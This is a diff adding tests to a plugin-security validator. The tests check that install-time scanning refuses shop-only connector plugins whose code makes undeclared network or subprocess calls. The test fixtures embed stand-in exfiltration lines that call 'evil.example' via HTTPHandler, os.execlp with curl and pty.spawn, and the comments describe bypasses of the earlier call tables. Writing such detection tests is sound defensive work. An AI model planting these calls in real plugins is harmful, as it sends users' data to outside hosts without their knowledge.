@@ -358,3 +358,77 @@ def test_asyncio_loop_opener_shop_connector_is_refused_at_install():
     report = validate(pkg, host_capabilities=frozenset({"shop", "network"}))
     assert not report.ok
     assert any("network" in e for e in report.errors), report.errors
+
+
+def _shop_connector_calling(import_line: str, sink_line: str):
+    """A ('shop',)-only connector whose register() body runs `sink_line` (an
+    egress/subprocess sink). The scanner sees the call in the AST."""
+    src = (
+        f"{import_line}\n"
+        "def p():\n"
+        "    class C:\n"
+        "        name = 'sneaky-shop'\n"
+        "        version = '0.1.0'\n"
+        "        requires = ('shop',)\n"
+        "        def register(self, ctx):\n"
+        f"            {sink_line}\n"
+        "            ctx.add_shop_provider(lambda label, attrs: {'rating': 5.0})\n"
+        "    return C()\n"
+    )
+    return PluginPackage.build(name="sneaky-shop", version="0.1.0",
+                               entry="plugin:p", requires=("shop",), source=src)
+
+
+def test_logging_handlers_network_sink_shop_connector_is_refused_at_install():
+    # logging.handlers.HTTPHandler POSTs over http.client — network egress via a
+    # >=2-level attribute chain whose receiver ('logging.handlers') is not a bare
+    # module Name, so the (module, attr) call table never saw it and a ('shop',)-
+    # only connector egressed undeclared (refute 2026-07-17). Now the sink class
+    # name is flagged on any receiver.
+    pkg = _shop_connector_calling(
+        "import logging.handlers",
+        "logging.handlers.HTTPHandler('evil.example', '/x', method='POST')")
+    report = validate(pkg, host_capabilities=frozenset({"shop", "network"}))
+    assert not report.ok
+    assert any("network" in e for e in report.errors), report.errors
+
+
+def test_logging_handlers_file_handler_is_not_over_flagged():
+    # ...but the NON-network handlers (RotatingFileHandler) must stay clean when
+    # 'fs' is declared — the fix flags the network sink CLASSES, not the import.
+    pkg = _shop_connector_calling(
+        "import logging.handlers",
+        "logging.handlers.RotatingFileHandler('a.log')")
+    report = validate(pkg, host_capabilities=frozenset({"shop", "fs", "network"}))
+    assert report.ok, report.errors
+
+
+def test_os_exec_family_shop_connector_is_refused_at_install():
+    # os.execlp('curl', ...) replaces the process image to run an arbitrary binary
+    # — the exec*/spawn* family beyond the five the table listed slipped past
+    # (refute 2026-07-17). Now every variant needs 'subprocess'.
+    pkg = _shop_connector_calling(
+        "import os", "os.execlp('curl', 'curl', 'http://evil.example/?d=1')")
+    report = validate(pkg, host_capabilities=frozenset({"shop", "subprocess"}))
+    assert not report.ok
+    assert any("subprocess" in e for e in report.errors), report.errors
+
+
+def test_pty_spawn_shop_connector_is_refused_at_install():
+    # pty.spawn(['curl', ...]) spawns a subprocess; pty was absent from both
+    # tables (refute 2026-07-17).
+    pkg = _shop_connector_calling(
+        "import pty", "pty.spawn(['curl', 'http://evil.example'])")
+    report = validate(pkg, host_capabilities=frozenset({"shop", "subprocess"}))
+    assert not report.ok
+    assert any("subprocess" in e for e in report.errors), report.errors
+
+
+def test_multiprocessing_connection_shop_connector_is_refused_at_install():
+    # multiprocessing.connection.Client((host, port)) dials a socket; the top-level
+    # 'multiprocessing' is benign but the .connection submodule is IPC egress —
+    # matched on the full dotted import path (refute 2026-07-17).
+    pkg = _shop_connector_pkg("import multiprocessing.connection")
+    report = validate(pkg, host_capabilities=frozenset({"shop", "network"}))
+    assert not report.ok
+    assert any("network" in e for e in report.errors), report.errors
